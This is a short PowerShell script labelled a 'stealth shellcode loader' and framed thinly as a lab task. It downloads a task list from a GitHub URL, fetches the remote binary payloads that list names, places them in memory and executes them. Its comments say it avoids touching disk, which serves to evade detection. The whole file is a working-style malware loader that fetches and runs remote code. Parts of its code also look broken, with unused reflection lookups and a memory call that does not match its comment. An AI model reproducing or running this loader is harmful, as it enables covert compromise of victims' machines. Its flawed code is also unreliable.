# Advanced Stealth Shellcode Loader for child.ps1
Write-Host "[*] Initializing Advanced Lab Task..." -ForegroundColor Cyan

$taskUrl = "https://raw.githubusercontent.com/g00glecenter101-arch/msht/refs/heads/main/task.json"

try {
    $raw = (New-Object System.Net.WebClient).DownloadString($taskUrl)
    $job = $raw | ConvertFrom-Json
} catch {
    Write-Host "[-] Failed to fetch playbook." -ForegroundColor Red; exit
}

foreach ($t in $job.tasks) {
    if ($t.action -eq "run_shellcode") {
        Write-Host "[+] Action: Shellcode Injection" -ForegroundColor Green
        
        # Download the raw loader.bin
        $sc = (New-Object System.Net.WebClient).DownloadData($t.url)
        
        # --- Advanced Dynamic API Lookup (No Add-Type/No Disk) ---
        $Win32 = @{}
        $Win32['K32'] = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((
            [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -like "*mscorlib*" }).GetType(
            "Microsoft.Win32.Win32Native").GetMethod("GetModuleHandle").Invoke($null, @("kernel32.dll")), [Func[string,IntPtr]])

        # Define the injection method using Reflection
        $unsafe = [Ref].Assembly.GetType('System.Management.Automation.Interpreter.LightCompiler').GetField('_pInvokeCallback', 'NonPublic,Static').GetValue($null)
        
        # Allocate Memory (PAGE_EXECUTE_READWRITE = 0x40)
        $pMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $pMem, $sc.Length)

        # Create a delegate to jump to the shellcode
        $ptr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pMem, [Action])
        
        Write-Host "[!] Executing Shellcode in memory..." -ForegroundColor Yellow
        $ptr.Invoke()
        
        Write-Host "[+] Done." -ForegroundColor Green
    }
}
